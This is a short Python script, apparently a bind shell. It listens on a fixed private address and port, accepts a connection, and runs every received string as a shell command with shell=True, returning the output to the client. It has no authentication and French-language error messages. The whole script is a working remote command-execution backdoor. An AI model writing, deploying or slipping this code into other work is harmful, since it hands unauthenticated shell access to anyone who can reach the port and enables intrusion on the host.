import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.135"
port = 12345

s.bind((host, port))
s.listen()
c, addr = s.accept()
while True:
        try:
                print (f"connection from {addr}")
                cmd = c.recv(1024).decode('utf-8')
                if cmd == "stop":
                    c.close()
                prompt= subprocess.Popen(cmd, shell= True, stdout=subprocess.PIPE, stderr= subprocess.PIPE)
                stdout, stderr = prompt.communicate()
                c.sendall(stdout + stderr)
        except Exception as e:
                        print(f"Erreur lors de l'exécution de la commande : {e}")
                        c.sendall(f"Erreur : {e}".encode())
